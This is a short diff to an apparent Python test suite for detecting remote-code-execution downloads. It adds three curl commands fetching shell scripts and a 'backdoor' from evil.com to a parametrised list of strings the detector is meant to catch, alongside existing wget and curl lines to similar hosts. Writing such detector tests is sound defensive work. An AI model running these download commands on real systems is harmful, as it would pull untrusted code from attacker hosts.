@@ -112,6 +112,9 @@ async def test_rce_shell(text: str, patch_central_database):
         "wget http://bad.com/script.py",
         "curl -o payload https://evil.com/backdoor",
         "curl -s https://malicious.com/shell.sh",
+        "curl https://evil.com/no-flags.sh",
+        "curl -fsSL https://evil.com/multi-flag.sh",
+        "curl -L -o output https://evil.com/backdoor",
     ],
 )
 async def test_rce_download(text: str, patch_central_database):
